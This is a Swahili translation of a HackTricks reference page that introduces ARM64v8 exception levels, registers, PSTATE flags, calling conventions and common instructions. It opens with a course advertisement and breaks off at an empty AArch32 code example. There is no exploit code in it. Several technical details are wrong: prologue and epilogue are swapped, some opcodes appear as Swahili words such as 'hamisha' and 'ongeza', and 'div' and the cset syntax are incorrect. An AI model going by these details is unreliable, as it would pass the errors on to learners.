# Utangulizi wa ARM64v8

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Viwango vya Kipekee - EL (ARM64v8)**

Katika usanifu wa ARMv8, viwango vya utekelezaji, vinavyojulikana kama Viwango vya Kipekee (ELs), vinataja kiwango cha uwezo na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya kipekee, kuanzia EL0 hadi EL3, kila kimoja kikitoa lengo tofauti:

1. **EL0 - Hali ya Mtumiaji**:
* Hii ni kiwango cha chini cha uwezo na hutumiwa kwa kutekeleza nambari za maombi ya kawaida.
* Programu zinazoendesha kwenye EL0 zimejitenga kutoka kwa nyingine na kutoka kwa programu ya mfumo, ikiboresha usalama na utulivu.
2. **EL1 - Hali ya Msingi ya Mfumo wa Uendeshaji**:
* Zaidi ya majedwali ya mfumo wa uendeshaji hufanya kazi kwenye kiwango hiki.
* EL1 ina uwezo zaidi kuliko EL0 na inaweza kupata rasilimali za mfumo, lakini kwa baadhi ya vizuizi kuhakikisha uadilifu wa mfumo.
3. **EL2 - Hali ya Hypervisor**:
* Kiwango hiki hutumiwa kwa uvirtualization. Hypervisor inayotekelezwa kwenye EL2 inaweza kusimamia mifumo mingi ya uendeshaji (kila moja katika EL1 yake) ikitekelezwa kwenye vifaa vya kimwili sawa.
* EL2 hutoa vipengele vya kujitenga na kudhibiti mazingira vilivyovirtualized.
4. **EL3 - Hali ya Kufuatilia Salama**:
* Hii ni kiwango cha juu zaidi cha uwezo na mara nyingi hutumiwa kwa kuanzisha salama na mazingira ya utekelezaji yanayoweza kudhibitika.
* EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali salama na zisizo salama (kama vile kuanzisha salama, OS iliyosadikika, n.k.).

Matumizi ya viwango hivi hutoa njia iliyopangwa na salama ya kusimamia vipengele tofauti vya mfumo, kutoka kwa programu za watumiaji hadi programu ya mfumo yenye uwezo zaidi. Mbinu ya ARMv8 kwa viwango vya uwezo husaidia katika kujitenga kwa ufanisi sehemu tofauti za mfumo, hivyo kuboresha usalama na uthabiti wa mfumo.

## **Vidhibiti (ARM64v8)**

ARM64 ina **vidhibiti vya jumla vya 31**, vilivyopewa majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (baiti 8). Kwa operesheni zinazohitaji thamani za biti 32 tu, vidhibiti sawa vinaweza kupatikana kwa hali ya biti 32 kwa kutumia majina w0 hadi w30.

1. **`x0`** hadi **`x7`** - Mara nyingi hutumiwa kama vidhibiti vya kufuta na kwa kupitisha parameta kwa taratibu ndogo.
* **`x0`** pia inabeba data ya kurudi ya kazi
2. **`x8`** - Katika kerneli ya Linux, `x8` hutumiwa kama nambari ya wito wa mfumo kwa maelekezo ya `svc`. **Katika macOS x16 ndio hutumiwa!**
3. **`x9`** hadi **`x15`** - Vidhibiti vya muda mrefu zaidi, mara nyingi hutumiwa kwa vidhibiti vya mitaa.
4. **`x16`** na **`x17`** - **Vidhibiti vya Wito wa Ndani-ndani**. Vidhibiti vya muda mfupi kwa thamani za moja kwa moja. Pia hutumiwa kwa wito wa kazi za moja kwa moja na PLT (Jedwali la Uunganisho wa Taratibu) stubs.
* **`x16`** hutumiwa kama **nambari ya wito wa mfumo** kwa maelekezo ya **`svc`** katika **macOS**.
5. **`x18`** - **Kudhibiti jukwaa**. Inaweza kutumika kama kudhibiti wa jumla, lakini kwenye majukwaa fulani, kudhibiti huu unahifadhiwa kwa matumizi maalum ya jukwaa: Kiashiria kwa kizuizi cha mazingira ya wajibu wa sasa katika Windows, au kuashiria muundo wa kazi inayoendeshwa kwa sasa katika kerneli ya Linux.
6. **`x19`** hadi **`x28`** - Hizi ni vidhibiti vinavyohifadhiwa na wito. Kazi lazima ihifadhi thamani za vidhibiti hivi kwa mpigaji wake, kwa hivyo zinahifadhiwa kwenye stak na kurejeshwa kabla ya kurudi kwa mpigaji.
7. **`x29`** - **Kudhibiti wa Fremu** kufuatilia fremu ya stak. Wakati fremu mpya ya stak inaundwa kwa sababu kazi inaitwa, kudhibiti cha **`x29`** kina **hifadhiwa kwenye stak** na anwani mpya ya fremu (**anwani ya `sp`**) inahifadhiwa kwenye kudhibiti hiki.
* Kudhibiti hiki pia kinaweza kutumika kama **kudhibiti wa jumla** ingawa kawaida hutumiwa kama kumbukumbu ya **vidhibiti vya mitaa**.
8. **`x30`** au **`lr`**- **Kudhibiti wa Kiungo**. Unashikilia **anwani ya kurudi** wakati maelekezo ya `BL` (Tawi na Kiungo) au `BLR` (Tawi na Kiungo kwenda Kudhibiti) yanatekelezwa kwa kuhifadhi thamani ya **`pc`** kwenye kudhibiti hiki.
* Inaweza pia kutumika kama kudhibiti lingine lolote.
* Ikiwa kazi ya sasa itaita kazi mpya na hivyo kubadilisha `lr`, itahifadhi kwenye stak mwanzoni, hii ni epilogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na pata `fp` mpya) na kuirudisha mwishoni, hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rudisha `fp` na `lr` na rudi).
9. **`sp`** - **Kielekezi cha Stak**, hutumiwa kufuatilia juu ya stak.
* thamani ya **`sp`** daima inapaswa kudumishwa angalau kwa **urekebishaji wa quadword** au kutokea kwa kipekee cha urekebishaji.
10. **`pc`** - **Kielekezi cha Programu**, kinachoelekeza kwa maelekezo yanayofuata. Kudhibiti hiki kinaweza kusasishwa kupitia kizazi cha kipekee, kurudi kwa kipekee, na matawi. Maelekezo ya kawaida pekee yanayoweza kusoma kudhibiti hiki ni maelekezo ya tawi na kiungo (BL, BLR) kuhifadhi anwani ya **`pc`** kwenye **`lr`** (Kudhibiti la Kiungo).
11. **`xzr`** - **Kudhibiti cha Sifuri**. Pia huitwa **`wzr`** katika fomu yake ya kudhibiti ya biti **32**. Inaweza kutumika kupata thamani ya sifuri kwa urahisi (operesheni ya kawaida) au kufanya mlinganisho kutumia **`subs`** kama **`subs XZR, Xn, #10`** kuhifadhi data inayotokana mahali popote (katika **`xzr`**).

Vidhibiti vya **`Wn`** ni toleo la **32bit** la kudhibiti cha **`Xn`**.

### Vidhibiti vya SIMD na Floating-Point

Zaidi ya hayo, kuna vidhibiti vingine **32 vya urefu wa 128bit** vinavyoweza kutumika katika operesheni zilizooanishwa za data nyingi kwa maelekezo moja (SIMD) na kwa kufanya hesabu za nukta kikomo. Hivi huitwa vidhibiti vya Vn ingawa wanaweza pia kufanya kazi katika **64**-bit, **32**-bit, **16**-bit na **8**-bit na kisha huitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.
### Vipimo vya Mfumo

**Kuna mamia ya vipimo vya mfumo**, vinavyoitwa pia kama vipimo maalum vya kusudi (SPRs), hutumika kwa **kufuatilia** na **kudhibiti** **tabia za processors**.\
Vinaweza kusomwa au kuwekwa tu kwa kutumia maagizo maalum yaliyotengwa **`mrs`** na **`msr`**.

Vipimo maalum **`TPIDR_EL0`** na **`TPIDDR_EL0`** mara nyingi hupatikana wakati wa kurekebisha. Kiambishi cha `EL0` kinaonyesha **kosa la chini** ambalo kipimo kinaweza kupatikana nacho (katika kesi hii EL0 ni kosa la kawaida (haki) ambalo programu za kawaida hufanya nalo).\
Maranyingi hutumika kuhifadhi **anwani ya msingi ya eneo la kuhifadhi la mnyororo wa wateja** la kumbukumbu. Kawaida la kwanza linaweza kusomwa na kuandikwa kwa programu zinazoendesha katika EL0, lakini la pili linaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).

* `mrs x0, TPIDR_EL0 ; Soma TPIDR_EL0 hadi x0`
* `msr TPIDR_EL0, X0 ; Andika x0 kwa TPIDR_EL0`

### **PSTATE**

**PSTATE** ina vipengele vingi vya mchakato vilivyosanidishwa katika kipimo maalum cha **`SPSR_ELx`**, X ikiwa ni **kiwango cha ruhusa cha kosa** kilichosababishwa (hii inaruhusu kurejesha hali ya mchakato wakati kosa linamalizika).\
Hizi ni sehemu zinazopatikana:

<figure><img src="../../../.gitbook/assets/image (1193).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** na **`V`** hali za hali:
* **`N`** inamaanisha operesheni ilizalisha matokeo hasi
* **`Z`** inamaanisha operesheni ilizalisha sifuri
* **`C`** inamaanisha operesheni ilibeba
* **`V`** inamaanisha operesheni ilizalisha kipeo kilichosainiwa:
* Jumla ya nambari mbili chanya inazalisha matokeo hasi.
* Jumla ya nambari mbili hasi inazalisha matokeo chanya.
* Katika upunguzaji, wakati nambari kubwa hasi inapunguzwa kutoka kwa nambari ndogo chanya (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya safu ya ukubwa wa biti iliyotolewa.
* Kwa dhahiri processor hajui operesheni ni ya kusainiwa au la, kwa hivyo itachunguza C na V katika operesheni na kuonyesha ikiwa kipeo kilitokea ikiwa ilikuwa ya kusainiwa au la.

{% hint style="warning" %}
Sio maagizo yote yanayosasisha hali hizi. Baadhi kama **`CMP`** au **`TST`** hufanya hivyo, na zingine zenye kiambishi cha s kama **`ADDS`** pia hufanya hivyo.
{% endhint %}

* **Kiwango cha sasa cha usajili (`nRW`)** hali: Ikiwa bendera inashikilia thamani 0, programu itaendeshwa katika hali ya utekelezaji wa AArch64 mara tu itakaporejeshwa.
* **Kiwango cha Kosa la Kipekee** (**`EL`**): Programu ya kawaida inayoendesha katika EL0 itakuwa na thamani 0
* Kipeo cha **hatua moja** bendera (**`SS`**): Hutumiwa na wachunguzi wa kosa kwa hatua moja kwa kuweka bendera ya SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia kosa. Programu itaendesha hatua na kutoa kosa la hatua moja.
* Kipeo cha hali ya kosa **isivyoruhusiwa** bendera (**`IL`**): Hutumiwa kuashiria wakati programu yenye ruhusa inafanya uhamisho wa kiwango cha kosa usio halali, bendera hii inawekwa kuwa 1 na processor kuzindua kosa la hali isiyo halali.
* Bendera za **`DAIF`**: Bendera hizi huruhusu programu yenye ruhusa kuficha kwa hiari baadhi ya kipeo cha nje.
* Ikiwa **`A`** ni 1 inamaanisha **kuzimwa kwa ghafla** kutazinduliwa. **`I`** inaashiria kujibu kwa **Ombi la Kuingilia** la vifaa vya nje (IRQs). na F inahusiana na **Ombi za Kuingilia Haraka** (FIRs).
* Bendera za **teuzi za kidole cha mstari** (**`SPS`**): Programu zenye ruhusa zinazoendesha katika EL1 na zaidi zinaweza kubadilishana kati ya kutumia usajili wao wa kidole cha mstari na wa mtumiaji (k.m. kati ya `SP_EL1` na `EL0`). Hii kubadilishana hufanywa kwa kuandika kwa kipimo maalum cha **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.

## **Mkataba wa Kuita (ARM64v8)**

Mkataba wa kuita wa ARM64 unabainisha kwamba **parameta nane za kwanza** kwa kazi hutumwa katika usajili **`x0` hadi `x7`**. **Parameta zaidi** hutumwa kwenye **stakishi**. Thamani ya **kurudi** hutumwa kwenye usajili **`x0`**, au pia katika **`x1`** ikiwa ni **biti 128 ndefu**. Usajili wa **`x19`** hadi **`x30`** na **`sp`** lazima uhifadhiwe kwa wito wa kazi.

Unaposoma kazi katika mkusanyiko, tafuta **prologue na epilogue** ya kazi. **Prologue** kawaida inajumuisha **kuhifadhi kiashiria cha fremu (`x29`)**, **kuweka** fremu **muhimu**, na **kutenga nafasi ya stakishi**. **Epilogue** kawaida inajumuisha **kurudisha kiashiria cha fremu kilichohifadhiwa** na **kurudi** kutoka kwa kazi.

### Mkataba wa Kuita katika Swift

Swift ina **mkataba wake wa kuita** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Maagizo ya Kawaida (ARM64v8)**

Maagizo ya ARM64 kwa ujumla yana **muundo wa `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama vile `ongeza`, `punguza`, `hamisha`, nk.), **`dst`** ni usajili wa **marudio** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni **usajili wa chanzo**. Thamani za moja kwa moja pia zinaweza kutumika mahali pa usajili wa chanzo.

* **`hamisha`**: **Hamisha** thamani kutoka kwa **usajili** mmoja kwenda mwingine.
* Mfano: `hamisha x0, x1` — Hii inahamisha thamani kutoka `x1` hadi `x0`.
* **`ldr`**: **Pakia** thamani kutoka kwa **kumbukumbu** hadi **usajili**.
* Mfano: `ldr x0, [x1]` — Hii inapakia thamani kutoka kwenye eneo la kumbukumbu linaloelekezwa na `x1` hadi `x0`.
* **Hali ya kufuta**: Kufuta inayoathiri kidole cha mstari inaonyeshwa, kwa mfano:
* `ldr x2, [x1, #8]`, hii itapakia x2 thamani kutoka x1 + 8
* &#x20;`ldr x2, [x0, x1, lsl #2]`, hii itapakia x2 kitu kutoka kwenye safu x0, kutoka kwenye nafasi x1 (indeksi) \* 4
* **Hali ya kabla ya teuzi**: Hii itatumia hesabu kwa asili, kupata matokeo na pia kuhifadhi asili mpya katika asili.
* `ldr x2, [x1, #8]!`, hii itapakia `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
* `str lr, [sp, #-4]!`, Hifadhi kiashiria cha kiungo katika sp na sasisha usajili wa sp
* **Hali ya baada ya teuzi**: Hii ni kama ile ya awali lakini anwani ya kumbukumbu inafikiwa kisha kufuta inahesabiwa na kuhifadhiwa.
* `ldr x0, [x1], #8`, pakia `x1` katika `x0` na sasisha x1 na `x1 + 8`
* **Anwani inayohusiana na PC**: Katika kesi hii anwani ya kupakia inahesabiwa kulingana na usajili wa PC
* `ldr x1, =_start`, Hii itapakia anwani ambapo ishara ya `_start` inaanza katika x1 inayohusiana na PC ya sasa.
* **`str`**: **Hifadhi** thamani kutoka kwa **usajili** kwenda kwa **kumbukumbu**.
* Mfano: `str x0, [x1]` — Hii inahifadhi thamani katika `x0` kwenye eneo la kumbukumbu linaloelekezwa na `x1`.
* **`ldp`**: **Pakia Jozi ya Usajili**. Maagizo haya **hupakia usajili mbili** kutoka kwa **eneo la kumbukumbu** za mfululizo. Anwani ya kumbukumbu kawaida hupatikana kwa kuongeza kufuta kwa thamani katika usajili mwingine.
* Mfano: `ldp x0, x1, [x2]` — Hii inapakia `x0` na `x1` kutoka kwenye maeneo ya kumbukumbu kwenye `x2` na `x2 + 8`, mtawalia.
* **`stp`**: **Hifadhi Jozi ya Usajili**. Maagizo haya **huhifadhi usajili mbili** kwa **eneo la kumbukumbu** za mfululizo. Anwani ya kumbukumbu kawaida hupatikana kwa kuongeza kufuta kwa thamani katika usajili mwingine.
* Mfano: `stp x0, x1, [sp]` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu kwenye `sp` na `sp + 8`, mtawalia.
* `stp x0, x1, [sp, #16]!` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu kwenye `sp+16` na `sp + 24`, mtawalia, na kusasisha `sp` na `sp+16`.
* **`ongeza`**: **Ongeza** thamani za usajili mbili na uhifadhi matokeo katika usajili.
* **Syntax**: Ongeza(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Marudio
* Xn2 -> Operandi 1
* Xn3 | #imm -> Operandi 2 (kielekezi au mara moja)
* \[shift #N | RRX] -> Fanya mabadiliko au piga simu kwa RRX
* Mfano: `add x0, x1, x2` — Hii inaongeza thamani katika `x1` na `x2` pamoja na kuhifadhi matokeo katika `x0`.
* `add x5, x5, #1, lsl #12` — Hii inalingana na 4096 (1 iliyohamishwa mara 12) -> 1 0000 0000 0000 0000
* **`adds`** Hii hufanya `add` na kusasisha bendera
* **`sub`**: **Punguza** thamani za rejista mbili na uhifadhi matokeo katika rejista.
* Angalia **`add`** **syntax**.
* Mfano: `sub x0, x1, x2` — Hii inapunguza thamani katika `x2` kutoka `x1` na kuhifadhi matokeo katika `x0`.
* **`subs`** Hii ni kama sub lakini ikisasisha bendera
* **`mul`**: **Zidisha** thamani za **rejista mbili** na uhifadhi matokeo katika rejista.
* Mfano: `mul x0, x1, x2` — Hii inazidisha thamani katika `x1` na `x2` na kuhifadhi matokeo katika `x0`.
* **`div`**: **Gawanya** thamani ya rejista moja kwa nyingine na uhifadhi matokeo katika rejista.
* Mfano: `div x0, x1, x2` — Hii inagawanya thamani katika `x1` kwa `x2` na kuhifadhi matokeo katika `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Mbadala wa kushoto la mantiki**: Ongeza 0 kutoka mwisho ukihamisha biti nyingine mbele (zidisha mara n kwa 2)
* **Mbadala wa kulia la mantiki**: Ongeza 1 mwanzoni ukihamisha biti nyingine nyuma (gawa mara n kwa 2 kwa nambari zisizo na saini)
* **Mbadala wa kulia wa hisabati**: Kama **`lsr`**, lakini badala ya kuongeza 0 ikiwa biti muhimu zaidi ni 1, \*\*1s zinaongezwa (\*\*gawa mara n kwa 2 kwa nambari zenye saini)
* **Zungusha kulia**: Kama **`lsr`** lakini chochote kinachotolewa kulia kinawekwa kushoto
* **Zungusha Kulia na Panua**: Kama **`ror`**, lakini na bendera ya kubeba kama "biti muhimu zaidi". Kwa hivyo bendera ya kubeba inahamishiwa kwa biti ya 31 na biti iliyotolewa kwa bendera ya kubeba.
* **`bfm`**: **Harakisha Biti**, hizi ni operesheni **nakili biti `0...n`** kutoka kwa thamani na kuziweka katika nafasi **`m..m+n`**. **`#s`** inabainisha nafasi ya **biti ya kushoto** na **`#r`** kiasi cha **zungusha kulia**.
* Harakisha biti: `BFM Xd, Xn, #r`
* Harakisha biti yenye saini: `SBFM Xd, Xn, #r, #s`
* Harakisha biti isiyo na saini: `UBFM Xd, Xn, #r, #s`
* **Toa na Ingiza Harakisha Biti:** Nakili uga wa biti kutoka kwa rejista na uziweke katika rejista nyingine.
* **`BFI X1, X2, #3, #4`** Ingiza biti 4 kutoka X2 kutoka biti ya 3 ya X1
* **`BFXIL X1, X2, #3, #4`** Toa kutoka biti ya 3 ya X2 biti nne na uziweke kwa X1
* **`SBFIZ X1, X2, #3, #4`** Panua biti 4 kutoka X2 na uziweke kwa X1 kuanzia nafasi ya biti 3 ukiweka biti sahihi
* **`SBFX X1, X2, #3, #4`** Toa biti 4 ukiwaanza na biti 3 kutoka X2, panua biti sahihi, na weka matokeo kwa X1
* **`UBFIZ X1, X2, #3, #4`** Panua biti 4 kutoka X2 na uziweke kwa X1 kuanzia nafasi ya biti 3 ukiweka biti sahihi
* **`UBFX X1, X2, #3, #4`** Toa biti 4 ukiwaanza na biti 3 kutoka X2 na weka matokeo yaliyozidishwa na sifuri kwa X1.
* **Panua Saini Kwenda X:** Panua saini (au ongeza tu 0s katika toleo lisilo na saini) ya thamani ili kuweza kufanya operesheni nayo:
* **`SXTB X1, W2`** Panua saini ya baiti **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza biti 64
* **`SXTH X1, W2`** Panua saini ya nambari ya 16biti **kutoka W2 hadi X1** ili kujaza biti 64
* **`SXTW X1, W2`** Panua saini ya baiti **kutoka W2 hadi X1** ili kujaza biti 64
* **`UXTB X1, W2`** Ongeza 0s (bila saini) kwa baiti **kutoka W2 hadi X1** ili kujaza biti 64
* **`extr`:** Toa biti kutoka kwa **jozi ya rejista zilizounganishwa**.
* Mfano: `EXTR W3, W2, W1, #3` Hii ita **unganisha W1+W2** na pata **kutoka biti 3 ya W2 hadi biti 3 ya W1** na uhifadhi kwa W3.
* **`cmp`**: **Hakiki** rejista mbili na weka bendera za hali. Ni **jina mbadala la `subs`** ikisawazisha rejista ya marudio na rejista sifuri. Inafaa kujua ikiwa `m == n`.
* Inaunga mkono **syntax sawa na `subs`**
* Mfano: `cmp x0, x1` — Hii inahakiki thamani katika `x0` na `x1` na kuweka bendera za hali kulingana.
* **`cmn`**: **Hakiki hasi** ya operandi. Katika kesi hii ni **jina mbadala la `adds`** na inaunga mkono syntax sawa. Inafaa kujua ikiwa `m == -n`.
* **`ccmp`**: Hakiki ya masharti, ni hakiki ambayo itafanywa tu ikiwa hakiki ya awali ilikuwa kweli na itaweka wazi hasa biti za nzcv.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka kwenye func
* Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp` ya awali ilikuwa `NE`**, ikiwa haikuwa hivyo, biti za `nzcv` zitawekwa kama 0 (ambayo haitakidhi hakiki ya `blt`).
* Hii inaweza pia kutumika kama `ccmn` (sawa lakini hasi, kama `cmp` vs `cmn`).
* **`tst`**: Inachunguza ikiwa thamani za hakiki zote ni 1 (inafanya kazi kama na ANDS bila kuhifadhi matokeo mahali popote). Ni muhimu kuchunguza rejista na thamani na kuchunguza ikiwa biti yoyote ya rejista iliyotajwa katika thamani ni 1.
* Mfano: `tst X1, #7` Hakiki ikiwa biti za mwisho 3 za X1 ni 1
* **`teq`**: Operesheni ya XOR ikikataa matokeo
* **`b`**: Tawi lisilo na masharti
* Mfano: `b myFunction`&#x20;
* Tafadhali kumbuka hii haitajaza rejista ya kiungo na anwani ya kurudi (haifai kwa wito wa subrutine ambao unahitaji kurudi nyuma)
* **`bl`**: **Tawi** na kiungo, hutumiwa kwa **kuita** **subrutine**. Huhifadhi **anwani ya kurudi kwa `x30`**.
* Mfano: `bl myFunction` — Hii inaita kazi `myFunction` na kuhifadhi anwani ya kurudi kwa `x30`.
* Tafadhali kumbuka hii haitajaza rejista ya kiungo na anwani ya kurudi (haifai kwa wito wa subrutine ambao unahitaji kurudi nyuma)
* **`blr`**: **Tawi** na Kiungo kwa Rejista, hutumiwa kwa **kuita** **subrutine** ambapo lengo limetajwa katika **rejista**. Huhifadhi anwani ya kurudi kwa `x30`. (Hii ni&#x20;
* Mfano: `blr x1` — Hii inaita kazi ambayo anwani yake iko katika `x1` na kuhifadhi anwani ya kurudi kwa `x30`.
* **`ret`**: **Rudi** kutoka kwa **subrutine**, kawaida kwa kutumia anwani katika **`x30`**.
* Mfano: `ret` — Hii inarudi kutoka kwa subrutine ya sasa ikitumia anwani ya kurudi katika `x30`.
* **`b.<cond>`**: Matawi ya masharti
* **`b.eq`**: **Tawi ikiwa sawa**, kulingana na hakiki ya awali ya `cmp`.
* Mfano: `b.eq label` — Ikiwa hakiki ya awali ya `cmp` ilipata thamani mbili sawa, hii itaruka kwenye `label`.
* **`b.ne`**: **Branch if Not Equal**. Maelekezo haya yanachunguza bendera za hali (ambazo ziliwekwa na maelekezo ya kulinganisha hapo awali), na ikiwa thamani zilizolinganishwa hazikuwa sawa, inaruka kwenye lebo au anwani.
* Mfano: Baada ya maelekezo ya `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka kwenye `label`.
* **`cbz`**: **Compare and Branch on Zero**. Maelekezo haya yanalinganisha kisajili na sifuri, na ikiwa wana sawa, inaruka kwenye lebo au anwani.
* Mfano: `cbz x0, label` — Ikiwa thamani katika `x0` ni sifuri, hii inaruka kwenye `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. Maelekezo haya yanalinganisha kisajili na sifuri, na ikiwa hawako sawa, inaruka kwenye lebo au anwani.
* Mfano: `cbnz x0, label` — Ikiwa thamani katika `x0` si sifuri, hii inaruka kwenye `label`.
* **`tbnz`**: Angalia biti na ruka kwenye si-sifuri
* Mfano: `tbnz x0, #8, label`
* **`tbz`**: Angalia biti na ruka kwenye sifuri
* Mfano: `tbz x0, #8, label`
* **Operesheni za kuchagua kwa sharti**: Hizi ni operesheni ambazo tabia yake inatofautiana kulingana na bits za sharti.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa ni kweli, X0 = X1, ikiwa ni uongo, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = Xn, ikiwa ni uongo, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Ikiwa ni kweli, Xd = Xn + 1, ikiwa ni uongo, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = Xn, ikiwa ni uongo, Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> Ikiwa ni kweli, Xd = NOT(Xn), ikiwa ni uongo, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = Xn, ikiwa ni uongo, Xd = - Xm
* `cneg Xd, Xn, cond` -> Ikiwa ni kweli, Xd = - Xn, ikiwa ni uongo, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = 1, ikiwa ni uongo, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Ikiwa ni kweli, Xd = \<all 1>, ikiwa ni uongo, Xd = 0
* **`adrp`**: Hesabu **anwani ya ukurasa wa ishara** na iihifadhi kwenye kisajili.
* Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa wa `ishara` na kuuhifadhi kwenye `x0`.
* **`ldrsw`**: **Pakia** thamani ya **32-bit** iliyosainiwa kutoka kumbukumbu na **kuieneza hadi 64** biti.
* Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani iliyosainiwa ya biti 32 kutoka kwenye eneo la kumbukumbu linaloelekezwa na `x1`, inaeneza hadi biti 64, na kuuhifadhi kwenye `x0`.
* **`stur`**: **Hifadhi thamani ya kisajili kwenye eneo la kumbukumbu**, ikitumia mbadala kutoka kwa kisajili kingine.
* Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani katika `x0` kwenye anwani ya kumbukumbu ambayo ni byte 4 zaidi ya anwani iliyopo kwenye `x1`.
* **`svc`** : Fanya **wito wa mfumo**. Inasimama kwa "Wito wa Msimamizi". Wakati processor inatekeleza maelekezo haya, inabadilisha kutoka hali ya mtumiaji hadi hali ya msingi na inaruka kwenye eneo maalum kwenye kumbukumbu ambapo **msimamizi wa mfumo wa kernel** uko.
*   Mfano:

```armasm
mov x8, 93  ; Pakia nambari ya wito wa mfumo kwa ajili ya kutoka (93) kwenye kisajili x8.
mov x0, 0   ; Pakia nambari ya hali ya kutoka (0) kwenye kisajili x0.
svc 0       ; Fanya wito wa mfumo.
```

### **Prologi ya Kazi**

1. **Hifadhi kiungo cha usajili na kielekezi cha fremu kwenye steki**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Wekeza kidole cha fremu kipya**: `mov x29, sp` (inaweka kidole cha fremu kipya kwa kazi ya sasa)
3. **Tenga nafasi kwenye steki kwa mizani ya ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya baiti inayohitajika)

### **Epilogo ya Kazi**

1. **Futa mizani ya ndani (ikiwa ilikuwa imetengwa)**: `add sp, sp, <size>`
2. **Rejesha daftari la kiungo na kidole cha fremu**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Kurudi**: `ret` (inarejesha udhibiti kwa mtu aliyetoa wito kwa kutumia anwani kwenye daftari la viungo)

## Hali ya Utekelezaji ya AARCH32

Armv8-A inasaidia utekelezaji wa programu za biti 32. **AArch32** inaweza kukimbia katika moja ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadilisha kati yao kupitia **`interworking`**.\
Programu za biti 64 **zenye haki** zinaweza kupanga **utekelezaji wa programu za biti 32** kwa kutekeleza uhamisho wa kiwango cha kipekee kwenda kwa biti 32 zenye haki za chini.\
Tambua kwamba mpito kutoka biti 64 kwenda biti 32 hufanyika na kiwango cha kipekee cha chini (kwa mfano programu ya biti 64 katika EL1 ikichochea programu katika EL0). Hii hufanywa kwa kuweka **biti 4 ya** daftari maalum la usajili wa **`SPSR_ELx`** kuwa 1 wakati mchakato wa watumiaji wa `AArch32` uko tayari kutekelezwa na sehemu iliyobaki ya `SPSR_ELx` inahifadhi mipango ya **CPSR ya `AArch32`**. Kisha, mchakato wenye haki huita maagizo ya **`ERET`** ili mchakato ubadilike kwenda kwa **`AArch32`** ukiingia katika A32 au T32 kulingana na CPSR\*\*.\*\*

**`Interworking`** hufanyika kwa kutumia biti za J na T za CPSR. `J=0` na `T=0` inamaanisha **`A32`** na `J=0` na `T=1` inamaanisha **T32**. Hii kimsingi inamaanisha kuweka **biti ya chini kuwa 1** kuashiria seti ya maagizo ni T32.\
Hii inawekwa wakati wa **maagizo ya matawi ya interworking,** lakini pia inaweza kuwekwa moja kwa moja na maagizo mengine wakati PC inawekwa kama usajili wa marudio. Mfano:

Mfano mwingine:
```armasm
_start:
